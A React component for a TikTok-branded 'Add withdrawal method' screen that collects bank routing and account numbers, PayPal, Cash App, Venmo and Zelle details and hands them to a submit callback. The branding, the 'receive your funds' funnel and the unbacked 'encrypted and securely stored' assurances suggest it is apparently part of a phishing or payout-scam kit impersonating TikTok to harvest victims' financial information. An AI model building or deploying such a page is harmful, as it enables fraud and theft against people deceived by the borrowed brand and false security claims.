import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { ShieldCheck, ChevronRight, Building2, Wallet, DollarSign, Smartphone, Mail, Globe } from "lucide-react";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import TikTokHeader from "./TikTokHeader";

interface BankDetailsScreenProps {
  userName: string;
  onSubmit: (method: string, details: Record<string, string>) => void;
}

const WITHDRAWAL_METHODS = [
  { id: "bank", label: "Bank transfer", subtitle: "Direct deposit to your bank", icon: Building2 },
  { id: "paypal", label: "PayPal", subtitle: "Send to your PayPal email", icon: Wallet },
  { id: "cashapp", label: "Cash App", subtitle: "Send to your $Cashtag", icon: DollarSign },
  { id: "venmo", label: "Venmo", subtitle: "Send to your Venmo username", icon: Smartphone },
  { id: "zelle", label: "Zelle", subtitle: "Send to email or phone", icon: Mail },
  { id: "wire", label: "Wire Transfer", subtitle: "International or domestic wire", icon: Globe },
];

const US_BANKS = [
  "Bank of America", "Chase (JPMorgan Chase)", "Wells Fargo", "Citibank",
  "U.S. Bank", "PNC Bank", "Capital One", "TD Bank", "Truist Financial",
  "Goldman Sachs", "Morgan Stanley", "Charles Schwab", "HSBC Bank USA",
  "BMO Harris Bank", "Citizens Financial Group", "Fifth Third Bank",
  "KeyBank", "Huntington National Bank", "Regions Bank", "M&T Bank",
  "Ally Bank", "Discover Bank", "Synchrony Bank", "American Express National Bank",
];

type Step = "method" | "form" | "confirm";

const BankDetailsScreen = ({ userName, onSubmit }: BankDetailsScreenProps) => {
  const [step, setStep] = useState<Step>("method");
  const [selectedMethod, setSelectedMethod] = useState("");
  const [details, setDetails] = useState<Record<string, string>>({});
  const [confirmField, setConfirmField] = useState("");
  const [submitting, setSubmitting] = useState(false);

  const method = WITHDRAWAL_METHODS.find((m) => m.id === selectedMethod);

  const updateDetail = (key: string, value: string) =>
    setDetails((prev) => ({ ...prev, [key]: value }));

  const isFormValid = () => {
    if (selectedMethod === "bank" || selectedMethod === "wire") {
      return (
        details.bank && (details.routing?.length ?? 0) >= 9 &&
        (details.account?.length ?? 0) >= 4 && details.account === confirmField
      );
    }
    if (selectedMethod === "paypal" || selectedMethod === "zelle") {
      return (details.email?.length ?? 0) > 3;
    }
    if (selectedMethod === "cashapp") {
      return (details.cashtag?.length ?? 0) > 1;
    }
    if (selectedMethod === "venmo") {
      return (details.username?.length ?? 0) > 1;
    }
    return false;
  };

  const handleConfirm = async () => {
    setSubmitting(true);
    await onSubmit(selectedMethod, details);
    setSubmitting(false);
  };

  // --- METHOD SELECTION ---
  if (step === "method") {
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <p className="text-sm text-muted-foreground mb-1">
            Welcome back, <strong className="text-foreground">{userName}!</strong>
          </p>
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Add withdrawal method</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Step 3 of 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-5">
            Choose how you'd like to receive your funds.
          </p>

          <div className="rounded-2xl border border-border bg-card overflow-hidden">
            {WITHDRAWAL_METHODS.map((m, i) => {
              const Icon = m.icon;
              return (
                <button
                  key={m.id}
                  onClick={() => { setSelectedMethod(m.id); setStep("form"); }}
                  className={`w-full flex items-center gap-3.5 px-4 py-3.5 text-left hover:bg-accent/50 transition-colors ${
                    i < WITHDRAWAL_METHODS.length - 1 ? "border-b border-border" : ""
                  }`}
                >
                  <div className="w-10 h-10 rounded-xl bg-secondary flex items-center justify-center shrink-0">
                    <Icon className="w-5 h-5 text-foreground" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-sm font-medium">{m.label}</p>
                    <p className="text-xs text-muted-foreground">{m.subtitle}</p>
                  </div>
                  <ChevronRight className="w-4 h-4 text-muted-foreground shrink-0" />
                </button>
              );
            })}
          </div>
        </div>
      </div>
    );
  }

  // --- CONFIRMATION ---
  if (step === "confirm") {
    const entries = Object.entries(details).filter(([, v]) => v);
    return (
      <div className="min-h-screen flex flex-col bg-background">
        <TikTokHeader showHelp />
        <div className="flex-1 px-6 py-6">
          <div className="mt-4 mb-2 flex items-center justify-between">
            <h2 className="text-xl font-semibold">Confirm your details</h2>
            <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
              Step 3 of 4
            </span>
          </div>
          <p className="text-sm text-muted-foreground mb-6">
            Review your {method?.label} information before submitting.
          </p>

          <div className="rounded-2xl border border-border bg-card p-5 space-y-4">
            <div>
              <p className="text-xs text-muted-foreground">Method</p>
              <p className="text-sm font-medium">{method?.label}</p>
            </div>
            {entries.map(([key, value]) => (
              <div key={key}>
                <div className="h-px bg-border" />
                <div className="pt-4">
                  <p className="text-xs text-muted-foreground capitalize">{key.replace(/([A-Z])/g, " $1")}</p>
                  <p className="text-sm font-medium">
                    {key === "account"
                      ? value.slice(0, -4).replace(/./g, "•") + value.slice(-4)
                      : value}
                  </p>
                </div>
              </div>
            ))}
          </div>

          <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mt-5">
            <ShieldCheck className="w-4 h-4 text-success shrink-0" />
            <p className="text-xs text-muted-foreground">
              Your data is <strong className="text-foreground">encrypted</strong> and protected.
            </p>
          </div>

          <Button onClick={handleConfirm} disabled={submitting} className="w-full h-14 rounded-full text-base font-semibold mt-8">
            {submitting ? (
              <span className="flex items-center gap-2">
                <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
                Processing...
              </span>
            ) : (
              "Confirm & Continue"
            )}
          </Button>
          <Button variant="ghost" onClick={() => setStep("form")} className="w-full mt-3 text-sm text-muted-foreground">
            ← Go back and edit
          </Button>
        </div>
      </div>
    );
  }

  // --- FORM (per method) ---
  const isBankType = selectedMethod === "bank" || selectedMethod === "wire";

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />
      <div className="flex-1 px-6 py-6">
        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">{method?.label} details</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Step 3 of 4
          </span>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Enter your {method?.label} information to receive your withdrawal.
        </p>

        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">
            Your data is <strong className="text-foreground">encrypted</strong> and securely stored.
          </p>
        </div>

        <div className="space-y-4">
          {isBankType && (
            <>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Select your bank</label>
                <Select value={details.bank || ""} onValueChange={(v) => updateDetail("bank", v)}>
                  <SelectTrigger className="h-12 rounded-xl">
                    <SelectValue placeholder="Choose a bank..." />
                  </SelectTrigger>
                  <SelectContent className="max-h-60">
                    {US_BANKS.map((b) => (
                      <SelectItem key={b} value={b}>{b}</SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Routing Number</label>
                <Input
                  type="text" inputMode="numeric" maxLength={9} placeholder="9 digits"
                  value={details.routing || ""}
                  onChange={(e) => updateDetail("routing", e.target.value.replace(/\D/g, ""))}
                  className="h-12 rounded-xl"
                />
                {(details.routing?.length ?? 0) > 0 && (details.routing?.length ?? 0) < 9 && (
                  <p className="text-xs text-destructive mt-1">Must be 9 digits</p>
                )}
              </div>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Account Number</label>
                <Input
                  type="text" inputMode="numeric" maxLength={17} placeholder="Enter account number"
                  value={details.account || ""}
                  onChange={(e) => updateDetail("account", e.target.value.replace(/\D/g, ""))}
                  className="h-12 rounded-xl"
                />
              </div>
              <div>
                <label className="text-sm font-medium mb-1.5 block">Confirm Account Number</label>
                <Input
                  type="text" inputMode="numeric" maxLength={17} placeholder="Re-enter account number"
                  value={confirmField}
                  onChange={(e) => setConfirmField(e.target.value.replace(/\D/g, ""))}
                  className="h-12 rounded-xl"
                />
                {confirmField.length > 0 && details.account !== confirmField && (
                  <p className="text-xs text-destructive mt-1">Account numbers don't match</p>
                )}
              </div>
            </>
          )}

          {selectedMethod === "paypal" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">PayPal Email</label>
              <Input
                type="email" placeholder="you@example.com"
                value={details.email || ""}
                onChange={(e) => updateDetail("email", e.target.value)}
                className="h-12 rounded-xl"
              />
            </div>
          )}

          {selectedMethod === "cashapp" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">$Cashtag</label>
              <Input
                type="text" placeholder="$YourCashtag"
                value={details.cashtag || ""}
                onChange={(e) => updateDetail("cashtag", e.target.value)}
                className="h-12 rounded-xl"
              />
            </div>
          )}

          {selectedMethod === "venmo" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">Venmo Username</label>
              <Input
                type="text" placeholder="@username"
                value={details.username || ""}
                onChange={(e) => updateDetail("username", e.target.value)}
                className="h-12 rounded-xl"
              />
            </div>
          )}

          {selectedMethod === "zelle" && (
            <div>
              <label className="text-sm font-medium mb-1.5 block">Zelle Email or Phone</label>
              <Input
                type="text" placeholder="Email or phone number"
                value={details.email || ""}
                onChange={(e) => updateDetail("email", e.target.value)}
                className="h-12 rounded-xl"
              />
            </div>
          )}
        </div>

        <Button
          onClick={() => setStep("confirm")}
          disabled={!isFormValid()}
          className="w-full h-14 rounded-full text-base font-semibold mt-8"
        >
          Continue
        </Button>
        <Button variant="ghost" onClick={() => { setStep("method"); setDetails({}); setConfirmField(""); }} className="w-full mt-3 text-sm text-muted-foreground">
          ← Change method
        </Button>
      </div>
    </div>
  );
};

export default BankDetailsScreen;
